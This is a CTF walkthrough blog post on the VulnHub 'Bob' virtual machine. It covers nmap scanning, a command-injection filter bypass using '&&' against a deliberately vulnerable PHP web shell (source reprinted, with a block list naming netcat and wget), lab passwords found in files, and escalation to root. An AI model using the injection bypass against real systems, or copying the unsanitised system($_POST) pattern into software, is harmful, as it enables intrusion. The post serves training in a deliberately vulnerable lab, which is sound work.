---
categories: ["articles"]
tags: ["CTF", "VulnHub", "PaulW", "Linux", "Burpsuite"]
date: 2018-05-30T22:50:00Z
title: "Bob Vulnhub Vm Writeup"
url: /2018/05/30/bob-vulnhub-ctf-writeup/
---

Presented by [Paul w](authors/PaulW/)

[Follow me on Twitter](https://twitter.com/phyushin)

Introduction
===========
Tonight I thought I'd have a go at a box on [VulnHub](https://www.vulnhub.com) the box I picked was a fairly recent one as I wanted to ease myself back into doing some CTFs - I've been a bit busy doing other things recently - anyway I chose the box [Bob:1.0.1](https://www.vulnhub.com/entry/bob-101,226/) it sounded fairly simple:

_"Your Goal is to get the flag in /
Hints: Remember to look for hidden info/files"_


NMAP Scans
=================
The initial NMAP scan using: __nmap -v -sV -p- -T4 10.13.37.101__

```
Nmap scan report for 10.13.37.101
Host is up (0.00012s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
25468/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
MAC Address: 08:00:27:C0:CC:74 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

# Nmap done at Wed May 30 20:33:51 2018 -- 1 IP address (1 host up) scanned in 9.69 seconds
```

Now that we know what ports are open we do a further more _fine grained_ scan:
```
# Nmap 7.70 scan initiated Wed May 30 20:35:03 2018 as: nmap -v -sV -sC -p 80,25468 -oA bob-finegrain 10.13.37.101
Nmap scan report for 10.13.37.101
Host is up (0.00034s latency).
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
| http-robots.txt: 4 disallowed entries
| /login.php /dev_shell.php /lat_memo.html
|_/passwords.html
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
25468/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
| ssh-hostkey:
|   2048 84:f2:f8:e5:ed:3e:14:f3:93:d4:1e:4c:41:3b:a2:a9 (RSA)
|   256 5b:98:c7:4f:84:6e:fd:56:6a:35:16:83:aa:9c:ea:f8 (ECDSA)
|_  256 39:16:56:fb:4e:0f:50:85:40:d3:53:22:41:43:38:15 (ED25519)
MAC Address: 08:00:27:C0:CC:74 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

# Nmap done at Wed May 30 20:35:10 2018 -- 1 IP address (1 host up) scanned in 7.04 seconds
```
Attacking the Web Application
=============================
Immediately the http-robots.txt _disallowed entries_ shows an interesting file __dev_shell.php__ -
visiting dev_shell.php on the target shows a _command_ text box and a _submit_ button (Figure 1).

![image](images/bobctf/devshell.png)

Figure 1 - Result of inputting __whoami__ into the command text box.

But it looks like some commands are filtered out - for example the _ls_ command (Figure 2).

![image](images/bobctf/devshell_ls_as_input.png)

Figure 2 - Message indicating that ls is a filtered command.

In an attempt to bypass the filter we submit two commands with a semi colon _whoami;ls_  (Figure 3).

![image](images/bobctf/devshell_with_sc.png)

Figure 3 - Different message indicating that the semi-colon was picked up and is also filtered

But commands can also be strung together with _&&_ (__whomami && ls__) (Figure 4).

![image](images/bobctf/devshell_using_amp.png)

Figure 4 - An ls of the directory revealing some interesting files.

Looking at the files in the directory we can see that theres a __dev_shell.php.bak__ file, we can visit this file and it will download the file rather than trying to _interpret_ the PHP code.
contents of __dev_shell.php.bak__:
```
<html>
<body>
  <?php
    //init
    $invalid = 0;
    $command = ($_POST['in_command']);
    $bad_words = array("pwd", "ls", "netcat", "ssh", "wget", "ping", "traceroute", "cat", "nc");
  ?>
  <style>
    #back{
      position: fixed;
      top: 0;
      left: 0;
      min-width: 100%;
      min-height: 100%;
      z-index:-10
    }
      #shell{
        color: white;
        text-align: center;
    }
  </style>
  <div id="shell">
    <h2>
      dev_shell
    </h2>
    <form action="dev_shell.php" method="post">
      Command: <input type="text" name="in_command" /> <br>
      <input type="submit" value="submit">
    </form>
    <br>
    <h5>Output:</h5>
    <?php
    system("running command...");
      //executes system Command
      //checks for sneaky ;
      if (strpos($command, ';') !==false){
        system("echo Nice try skid, but you will never get through this bulletproof php code"); //doesn't work :P
      }
      else{
        $is_he_a_bad_man = explode(' ', trim($command));
        //checks for dangerous commands
        if (in_array($is_he_a_bad_man[0], $bad_words)){
          system("echo Get out skid lol");
        }
        else{
          system($_POST['in_command']);
        }
      }
    ?>
  </div>
    <img src="dev_shell_back.png" id="back" alt="">
</body>
</html>

```
We can see from the code above where the two warnings we had in earlier screenshots came from (we correctly assumed that if there were semi colons in the code that it would error):
```
if (strpos($command, ';') !==false){
        system("echo Nice try skid, but you will never get through this bulletproof php code"); //doesn't work :P
      }
```
Secondly the PHP script also checks the command input for words from the __$bad_words__ array before finally executing what ever is in the __$_POST['in_command']__ variable:
```php
if (in_array($is_he_a_bad_man[0], $bad_words)){
          system("echo Get out skid lol");
        }
        else{
          system($_POST['in_command']);
        }

  ```
Now that we know what commands we _can't_ use and that the commands are executed from a POST variable we can use [burpsuite](https://portswigger.net/burp) to help.

Using Burpsuite
===============
We need to configure our web browser to point to burp as out http proxy (Figure 5):

![image](images/bobctf/pointing_ff_at_burp.png)

Figure 5 - In the Preferences>advanced>network>connection settings

Burpsuite defaults to port 8080 - in this instance we've no need to change that! so away we go - clicking submit again should send the request to burp first and because by default it's set to intercept, it will appear nothing has happened - but if we look at burp we can see it's caught the request - we need to click the _forward_ button until we get the response (Figure 6).

![image](images/bobctf/burp_response.png)

Figure 6 - Our __whoami__ command being sent as a POST parameter.

Now we know the request has been sent we can now pass that request to the __repeater__ tab in burpsuite this is done by finding the desired request in the _http history_ tab and right clicking and clicking the __send to repeater__ context menu option (Figure 7).

![image](images/bobctf/burp_http_history.png)

Figure 7 - The HTTP history tab with the request we want to `repeat`

We can use burp to edit the parameter value of the __in_command__ parameter and get the return value back in the response window(Figure 8).

![image](images/bobctf/using_burp_to_ls_home.png)

Figure 8 - The result of the _ls /home_ directory.

Looking at the response we now have a list of users that we can potentially log in as (remember earlier we found SSH on a non-standard port); But we have a problem as we don't actually know any passwords just yet.

Using the burp repeater we can browse various directories and in elliot's home directory there is an interesting file(Figure 9).

![image](images/bobctf/elliothome.png)

Figure 9 - User has a text file named _theadminisdumb.txt_.

We should check it out - but remember we can't use __cat__ ... so lets use __more__


setting the in_command to __whoami && more/home/elliot/theadminisdumb.txt__ yeilds the following:

```
::::::::::::::
/home/elliot/theadminisdumb.txt
::::::::::::::
The admin is dumb,
In fact everyone in the IT dept is pretty bad but I can’t blame all of them the newbies Sebastian and James are quite new to managing a server so I can forgive them for that password file they made on the server.
But the admin now he’s quite something. Thinks he knows more than everyone else in the dept, he always yells at Sebastian and James now they do some dumb stuff but their new and this is just a high-school server who cares,
the only people that would try and hack into this are script kiddies. His wallpaper policy also is redundant, why do we need custom wallpapers that doesn’t do anything. I have been suggesting time and time again to Bob ways we could improve the security since he “cares” about it so much but he just yells at me and says I don’t know what i’m doing.
Sebastian has noticed and I gave him some tips on better securing his account, I can’t say the same for his friend James who doesn’t care and made his password: Qwerty.
To be honest James isn’t the worst bob is his stupid web shell has issues and I keep telling him what he needs to patch but he doesn’t care about what I have to say.
it’s only a matter of time before it’s broken into so because of this I have changed my password to
     theadminisdumb
I hope bob is fired after the future second breach because of his incompetence.
I almost want to fix it myself but at the same time it doesn’t affect me if they get breached, I get paid, he gets fired it’s a good time.
```
So now we have (hopefully) login credentials for the machine(Figure 10).

SSH Access and PrivEsc
======================

![image](images/bobctf/getting_ssh_access.png)

Figure 10 - Logging in as elliot with the password `theadminisdumb`.

Now that we have SSH access we're not limited to commands not in the __bad_words__ list.
Looking around the user's home directories with __ls -latr__ we notice an __.old_passwordfile.html__
examining this file with __more__:
```
<html>
<p>
jc:Qwerty
seb:T1tanium_Pa$$word_Hack3rs_Fear_M3
</p>
</html>

```
Our user elliot didnt have kind things to say about bob - and he seems to be our IT admin so lets have a poke through his folders a little deeper...

Bob's Document folder contains:
```
total 20
-rw-r--r--  1 bob bob  300 Mar  4 14:11 staff.txt
drwxr-xr-x  3 bob bob 4096 Mar  5 00:35 Secret
-rw-r--r--  1 bob bob   91 Mar  5 00:58 login.txt.gpg
drwxr-xr-x  3 bob bob 4096 Mar  5 01:02 .
drwxr-xr-x 18 bob bob 4096 May 30 17:03 ..
```

login.txt.gpg seems to be encrypted login credentials encrypted with GPG, before trying to crack it lets see if we can find the password do decrypt it...
Buried deep in the __Secret folder__ is a .sh file:
```
#!/bin/bash
clear
echo "-= Notes =-"
echo "Harry Potter is my faviorite"
echo "Are you the real me?"
echo "Right, I'm ordering pizza this is going nowhere"
echo "People just don't get me"
echo "Ohhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh <sea santy here>"
echo "Cucumber"
echo "Rest now your eyes are sleepy"
echo "Are you gonna stop reading this yet?"
echo "Time to fix the server"
echo "Everyone is annoying"
echo "Sticky notes gotta buy em"
```
At fist it looks like random list of notes (albiet with bad spelling) but running the script clears the screen and each line starts with a Capital letter spelling out the word _harpocrates_ - google reveals that _HARPOCRATES_ is the __god of silence secrets and confidentiality__ - that can't be coincidence...

![image](images/bobctf/harpocrates.png)

So lets try it
```
gpg --decrypt login.txt.gpg                                                                                                                                              
gpg: AES encrypted data
gpg: encrypted with 1 passphrase
bob:b0bcat_
```
Excellent! now we have bobs login let's see if we can elevate:

```
elliot@Milburg-High:/home/bob/Documents$ su
Password:
root@Milburg-High:/home/bob/Documents# whoami && hostname
root
Milburg-High
root@Milburg-High:/home/bob/Documents# more /flag.txt
CONGRATS ON GAINING ROOT

        .-.
       (   )
        |~|       _.--._
        |~|~:'--~'      |
        | | :   #root   |
        | | :     _.--._|
        |~|~`'--~'
        | |
        | |
        | |
        | |
        | |
        | |
        | |
        | |
        | |
   _____|_|_________ Thanks for playing ~c0rruptedb1t
root@Milburg-High:/home/bob/Documents#
```

Thanks that was fun !

Paul W
